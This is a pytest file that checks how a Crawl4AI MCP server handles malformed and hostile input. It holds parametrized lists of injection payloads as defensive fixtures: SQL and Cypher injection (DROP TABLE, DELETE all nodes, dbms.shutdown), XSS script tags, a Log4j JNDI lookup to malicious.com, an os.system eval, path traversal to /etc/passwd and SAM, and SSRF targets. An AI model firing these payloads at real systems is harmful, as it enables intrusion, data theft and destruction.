"""
Comprehensive input validation tests for Crawl4AI MCP.

Tests various input validation and boundary condition scenarios:
- Malformed URLs
- Invalid query parameters
- Type mismatches
- Null/undefined handling
- SQL injection prevention
- XSS prevention
- Resource limit violations
- Edge cases and boundary conditions
"""

import json
import os
import sys
from pathlib import Path
from unittest.mock import AsyncMock, Mock, patch

import pytest

# Add src to path for imports
src_path = Path(__file__).parent.parent / "src"
sys.path.insert(0, str(src_path))

from crawl4ai_mcp import (
    check_ai_script_hallucinations,
    parse_github_repository,
    perform_rag_query,
    query_knowledge_graph,
    scrape_urls,
    smart_crawl_url,
)


class MockContext:
    """Mock FastMCP Context for testing"""

    def __init__(self):
        self.request_context = Mock()
        self.request_context.lifespan_context = Mock()

        # Mock database client
        self.mock_db = AsyncMock()
        self.request_context.lifespan_context.database_client = self.mock_db

        # Mock crawler
        mock_crawler = AsyncMock()
        mock_crawler.__aenter__ = AsyncMock(return_value=mock_crawler)
        mock_crawler.__aexit__ = AsyncMock(return_value=None)
        mock_crawler.arun = AsyncMock()

        self.request_context.lifespan_context.crawler = mock_crawler
        self.request_context.lifespan_context.reranking_model = None
        self.request_context.lifespan_context.knowledge_validator = Mock()
        self.request_context.lifespan_context.repo_extractor = Mock()


class TestInputValidation:
    """Test input validation and boundary conditions comprehensively"""

    @pytest.fixture
    def mock_ctx(self):
        """Create mock context for tests"""
        return MockContext()

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "invalid_url",
        [
            "",  # Empty string
            "   ",  # Whitespace only
            "not-a-url",  # No protocol
            "ftp://invalid-protocol.com",  # Unsupported protocol
            "https://",  # Incomplete URL
            "https://.com",  # Invalid domain
            "https://example..com",  # Double dots in domain
            "https://example.com:99999",  # Invalid port
            "javascript:alert('xss')",  # Potential XSS
            "data:text/html,<script>alert('xss')</script>",  # Data URI XSS
            "https://example.com/path with spaces",  # Unencoded spaces
            "https://example.com/\x00null",  # Null bytes
            "https://192.168.1.1:22/ssh",  # Potential SSRF
            "https://localhost:5432/db",  # Local service access
            "https://10.0.0.1/internal",  # Private IP
        ],
    )
    async def test_malformed_url_validation(self, mock_ctx, invalid_url):
        """Test handling of various malformed URLs"""
        scrape_func = scrape_urls.fn if hasattr(scrape_urls, "fn") else scrape_urls
        result = await scrape_func(mock_ctx, invalid_url)

        result_data = json.loads(result)

        # Should either reject invalid URLs or handle them gracefully
        if invalid_url.strip() == "":
            assert result_data["success"] is False
            assert (
                "empty" in result_data["error"].lower()
                or "invalid" in result_data["error"].lower()
            )
        else:
            # May succeed or fail depending on validation strictness
            assert isinstance(result_data, dict)
            assert "success" in result_data

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "url_list",
        [
            [],  # Empty list
            [None],  # List with None
            ["https://valid.com", None, "https://also-valid.com"],  # Mixed valid/None
            [123, "https://valid.com"],  # Mixed types
            ["https://valid.com"] * 1000,  # Very large list
            [{"url": "https://example.com"}],  # Wrong type in list
        ],
    )
    async def test_url_list_validation(self, mock_ctx, url_list):
        """Test validation of URL lists with various invalid formats"""
        scrape_func = scrape_urls.fn if hasattr(scrape_urls, "fn") else scrape_urls
        result = await scrape_func(mock_ctx, url_list)

        result_data = json.loads(result)

        if not url_list:  # Empty list
            assert result_data["success"] is False
            assert "empty" in result_data["error"].lower()
        elif any(not isinstance(url, str) for url in url_list if url is not None):
            # Contains non-string types
            assert result_data["success"] is False
            assert (
                "string" in result_data["error"].lower()
                or "type" in result_data["error"].lower()
            )

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "invalid_param",
        [
            None,  # None value
            "",  # Empty string
            " " * 1000,  # Very long whitespace
            "x" * 10000,  # Extremely long string
            123,  # Wrong type
            [],  # Wrong type
            {"query": "test"},  # Wrong type
        ],
    )
    async def test_query_parameter_validation(self, mock_ctx, invalid_param):
        """Test validation of query parameters"""
        # Mock successful database response for valid queries
        mock_ctx.mock_db.search_documents.return_value = []

        rag_func = (
            perform_rag_query.fn
            if hasattr(perform_rag_query, "fn")
            else perform_rag_query
        )
        result = await rag_func(mock_ctx, invalid_param)

        result_data = json.loads(result)

        if invalid_param is None or invalid_param == "":
            assert result_data["success"] is False
            assert (
                "query" in result_data["error"].lower()
                or "empty" in result_data["error"].lower()
            )
        elif not isinstance(invalid_param, str):
            # May handle type coercion or reject
            assert isinstance(result_data, dict)
            assert "success" in result_data

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "invalid_count",
        [
            -1,  # Negative number
            0,  # Zero
            1.5,  # Float
            "10",  # String number
            None,  # None
            [],  # Wrong type
            float("inf"),  # Infinity
            float("nan"),  # NaN
            10**6,  # Extremely large number
        ],
    )
    async def test_match_count_validation(self, mock_ctx, invalid_count):
        """Test validation of match_count parameter"""
        mock_ctx.mock_db.search_documents.return_value = []

        rag_func = (
            perform_rag_query.fn
            if hasattr(perform_rag_query, "fn")
            else perform_rag_query
        )
        result = await rag_func(mock_ctx, "test query", match_count=invalid_count)

        result_data = json.loads(result)

        # Should handle invalid match_count gracefully
        if isinstance(invalid_count, (int, float)) and invalid_count <= 0:
            # May use default value or return error
            assert isinstance(result_data, dict)
        elif not isinstance(invalid_count, (int, float)):
            # Type error may be handled
            assert isinstance(result_data, dict)

    @pytest.mark.asyncio
    async def test_null_and_undefined_handling(self, mock_ctx):
        """Test handling of null and undefined values"""
        # Test with None values
        scrape_func = scrape_urls.fn if hasattr(scrape_urls, "fn") else scrape_urls
        result = await scrape_func(mock_ctx, None)

        result_data = json.loads(result)
        assert result_data["success"] is False
        assert (
            "url" in result_data["error"].lower()
            or "none" in result_data["error"].lower()
        )

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "malicious_query",
        [
            "'; DROP TABLE crawled_pages; --",  # SQL injection attempt
            "' OR '1'='1",  # SQL injection
            "<script>alert('xss')</script>",  # XSS attempt
            "javascript:void(0)",  # JavaScript injection
            "{{7*7}}",  # Template injection
            "${jndi:ldap://malicious.com/a}",  # Log4j injection
            "../../etc/passwd",  # Path traversal
            "../../../windows/system32/config/sam",  # Windows path traversal
            "\x00\x01\x02",  # Binary data
            "eval(__import__('os').system('ls'))",  # Python code injection
        ],
    )
    async def test_injection_attack_prevention(self, mock_ctx, malicious_query):
        """Test prevention of various injection attacks"""
        mock_ctx.mock_db.search_documents.return_value = []

        rag_func = (
            perform_rag_query.fn
            if hasattr(perform_rag_query, "fn")
            else perform_rag_query
        )
        result = await rag_func(mock_ctx, malicious_query)

        result_data = json.loads(result)

        # Should handle malicious input safely (not execute/interpret it)
        assert isinstance(result_data, dict)
        assert "success" in result_data

        # Should not contain signs of successful injection
        result_str = str(result_data).lower()
        assert "dropped" not in result_str
        assert "executed" not in result_str
        assert "<script>" not in str(result_data)

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "boundary_value",
        [
            -(2**31),  # Min 32-bit int
            2**31 - 1,  # Max 32-bit int
            -(2**63),  # Min 64-bit int
            2**63 - 1,  # Max 64-bit int
            0,  # Zero
            1,  # Minimum valid
            2**16,  # Large but reasonable
        ],
    )
    async def test_numeric_boundary_conditions(self, mock_ctx, boundary_value):
        """Test handling of numeric boundary conditions"""
        mock_ctx.mock_db.search_documents.return_value = []

        try:
            rag_func = (
                perform_rag_query.fn
                if hasattr(perform_rag_query, "fn")
                else perform_rag_query
            )
            result = await rag_func(mock_ctx, "test query", match_count=boundary_value)

            result_data = json.loads(result)
            assert isinstance(result_data, dict)

            # Negative or zero values should be handled appropriately
            if boundary_value <= 0:
                # May use default or return error
                assert "success" in result_data
        except (ValueError, OverflowError, TypeError):
            # Acceptable to raise exception for extreme values
            pass

    @pytest.mark.asyncio
    async def test_unicode_and_encoding_handling(self, mock_ctx):
        """Test handling of various Unicode and encoding scenarios"""
        unicode_queries = [
            "测试查询",  # Chinese
            "тест запрос",  # Cyrillic
            "🔍 emoji search 🚀",  # Emojis
            "café résumé naïve",  # Accented characters
            "\u0000\u0001\u0002",  # Control characters
            "zalgo̵̬̊ ̴̳̎t̷̰̂e̵̮̿x̸̰̅t̴̢̾",  # Zalgo text
            "RTL text ←→ LTR text",  # Mixed text direction
        ]

        mock_ctx.mock_db.search_documents.return_value = []

        for query in unicode_queries:
            rag_func = (
                perform_rag_query.fn
                if hasattr(perform_rag_query, "fn")
                else perform_rag_query
            )
            result = await rag_func(mock_ctx, query)

            result_data = json.loads(result)
            assert isinstance(result_data, dict)
            assert "success" in result_data

    @pytest.mark.asyncio
    async def test_file_path_validation(self, mock_ctx):
        """Test validation of file paths for security"""
        dangerous_paths = [
            "/etc/passwd",  # System file
            "../../etc/shadow",  # Path traversal
            "C:\\Windows\\System32\\config\\SAM",  # Windows system file
            "/dev/null",  # Device file
            "/proc/self/environ",  # Process info
            "//server/share/file",  # UNC path
            "file:///etc/passwd",  # File URI
            "\\\\?\\C:\\Windows\\System32",  # Extended path
            "\x00truncated.txt",  # Null byte injection
        ]

        # Mock environment to enable knowledge graph
        with patch.dict(os.environ, {"USE_KNOWLEDGE_GRAPH": "true"}):
            check_func = (
                check_ai_script_hallucinations.fn
                if hasattr(check_ai_script_hallucinations, "fn")
                else check_ai_script_hallucinations
            )

            for path in dangerous_paths:
                result = await check_func(mock_ctx, path)
                result_data = json.loads(result)

                # Should reject dangerous paths or handle them safely
                if any(
                    dangerous in path.lower()
                    for dangerous in ["/etc/", "system32", "/dev/", "/proc/"]
                ):
                    assert result_data["success"] is False
                    assert "error" in result_data

    @pytest.mark.asyncio
    async def test_resource_limit_validation(self, mock_ctx):
        """Test validation of resource limits"""
        # Test very large batch sizes
        large_batch_params = [
            {"max_concurrent": 10000},  # Excessive concurrency
            {"batch_size": 100000},  # Huge batch size
            {"max_depth": 1000},  # Deep recursion
        ]

        for params in large_batch_params:
            smart_func = (
                smart_crawl_url.fn
                if hasattr(smart_crawl_url, "fn")
                else smart_crawl_url
            )
            result = await smart_func(mock_ctx, "https://example.com", **params)

            result_data = json.loads(result)
            # Should either apply reasonable limits or reject extreme values
            assert isinstance(result_data, dict)
            assert "success" in result_data

    @pytest.mark.asyncio
    async def test_type_coercion_and_validation(self, mock_ctx):
        """Test type coercion and validation"""
        # Test various types that might need coercion
        type_test_cases = [
            ("123", int),  # String to int
            (123.0, int),  # Float to int
            (True, int),  # Boolean to int
            ([1, 2, 3], str),  # List to string
            ({"key": "value"}, str),  # Dict to string
        ]

        mock_ctx.mock_db.search_documents.return_value = []

        for value, expected_type in type_test_cases:
            try:
                rag_func = (
                    perform_rag_query.fn
                    if hasattr(perform_rag_query, "fn")
                    else perform_rag_query
                )
                result = await rag_func(
                    mock_ctx,
                    value if expected_type == str else "test query",
                    match_count=value if expected_type == int else 5,
                )

                result_data = json.loads(result)
                assert isinstance(result_data, dict)
            except (TypeError, ValueError):
                # Acceptable to reject incompatible types
                pass

    @pytest.mark.asyncio
    async def test_github_url_validation(self, mock_ctx):
        """Test GitHub URL validation"""
        invalid_github_urls = [
            "not-github.com/user/repo",  # Wrong domain
            "https://github.com/",  # Incomplete
            "https://github.com/user",  # No repo
            "https://github.com/user/",  # Trailing slash, no repo
            "https://github.com/user/repo/extra/path",  # Extra path
            "https://github.com/.../repo",  # Invalid user
            "https://github.com/user/...",  # Invalid repo
            "git@github.com:user/repo.git",  # SSH format
            "https://gist.github.com/user/123",  # Gist, not repo
        ]

        with patch.dict(os.environ, {"USE_KNOWLEDGE_GRAPH": "true"}):
            parse_func = (
                parse_github_repository.fn
                if hasattr(parse_github_repository, "fn")
                else parse_github_repository
            )

            for url in invalid_github_urls:
                result = await parse_func(mock_ctx, url)
                result_data = json.loads(result)

                # Should validate GitHub URLs properly
                if not url.startswith("https://github.com/") or url.count("/") < 4:
                    assert result_data["success"] is False
                    assert "error" in result_data

    @pytest.mark.asyncio
    async def test_cypher_query_injection_prevention(self, mock_ctx):
        """Test prevention of Cypher injection in Neo4j queries"""
        malicious_cypher_queries = [
            "MATCH (n) DELETE n",  # Delete all nodes
            "CREATE (:Malicious {data: 'injected'})",  # Create malicious data
            "MATCH (n) SET n.password = 'hacked'",  # Modify data
            "; DROP DATABASE;",  # SQL-style injection
            "' OR 1=1 --",  # SQL injection pattern
            "CALL dbms.shutdown()",  # Administrative command
        ]

        # Mock Neo4j session
        mock_session = AsyncMock()
        mock_ctx.request_context.lifespan_context.repo_extractor.driver.session.return_value.__aenter__.return_value = mock_session

        with patch.dict(os.environ, {"USE_KNOWLEDGE_GRAPH": "true"}):
            kg_func = (
                query_knowledge_graph.fn
                if hasattr(query_knowledge_graph, "fn")
                else query_knowledge_graph
            )

            for malicious_query in malicious_cypher_queries:
                result = await kg_func(mock_ctx, f"query {malicious_query}")
                result_data = json.loads(result)

                # Should either sanitize or reject dangerous queries
                assert isinstance(result_data, dict)
                # In a real implementation, dangerous queries should be blocked


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
